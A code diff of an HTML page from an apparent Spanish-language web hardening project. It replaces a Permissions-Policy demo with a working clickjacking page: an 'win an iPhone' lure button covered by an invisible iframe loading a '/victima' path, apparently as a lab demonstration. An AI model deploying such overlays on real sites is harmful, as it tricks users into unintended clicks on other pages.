@@ -1,10 +1,42 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Laravel Secure Permission Policy</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>nav {
+    <title>Gana un iPhone 🎁</title>
+    <style>
+        body {
+            text-align: center;
+            margin-top: 100px;
+        }
+
+        .contenedor {
+            position: relative;
+            width: 250px;
+            height: 80px;
+            margin: auto;
+        }
+
+        .boton-falso {
+            position: absolute;
+            width: 250px;
+            height: 80px;
+            background: green;
+            color: white;
+            font-size: 20px;
+            text-align: center;
+            line-height: 80px;
+            cursor: pointer;
+            z-index: 1;
+        }
+
+        iframe {
+            position: absolute;
+            width: 250px;
+            height: 80px;
+            opacity: 0;
+            z-index: 2;
+            border: none;
+        }
+        nav {
     position: fixed;
     top: 0;
     left: 0;
@@ -56,11 +88,12 @@
 
 .links a:hover::after {
     width: 100%;
-}</style>
+}
+    </style>
 </head>
-<body class="bg-gradient-to-r from-slate-900 to-slate-700 flex items-center justify-center h-screen">
+<body>
 
-   <nav>
+<nav>
     <div class="nav-container">
         <div class="logo">🛡 Hardening Project</div>
 
@@ -76,39 +109,12 @@
         </div>
     </div>
 </nav>
-<div class="bg-white/10 backdrop-blur-lg p-8 rounded-2xl shadow-xl text-white text-center w-96">
-    <h1 class="text-2xl font-bold mb-4">🔐 Permission-Policy Segura</h1>
-    
-    <p class="mb-2">✔ Geolocalización bloqueada</p>
-    <p class="mb-2">✔ Cámara bloqueada</p>
-    <p class="mb-2">✔ Micrófono bloqueado</p>
-    <p class="mb-2">✔ Payment API bloqueada</p>
-    <p class="mb-4">✔ Fullscreen permitido solo en este dominio</p>
+<h2>Haz clic para ganar un iPhone 📱</h2>
 
-    <button onclick="testGeo()" 
-        class="bg-blue-500 hover:bg-blue-600 px-4 py-2 rounded-lg transition">
-        Probar Geolocalización
-    </button>
-
-    <p id="result" class="mt-4 text-sm"></p>
+<div class="contenedor">
+    <div class="boton-falso">Haz clic aquí</div>
+    <iframe src="/victima"></iframe>
 </div>
-
-<script>
-function testGeo() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            () => {
-                document.getElementById("result").innerText = 
-                    "No debería funcionar si está bloqueado por policy.";
-            },
-            (error) => {
-                document.getElementById("result").innerText = 
-                    "✔ Bloqueado correctamente por Permission-Policy";
-            }
-        );
-    }
-}
-</script>
 
 </body>
 </html>
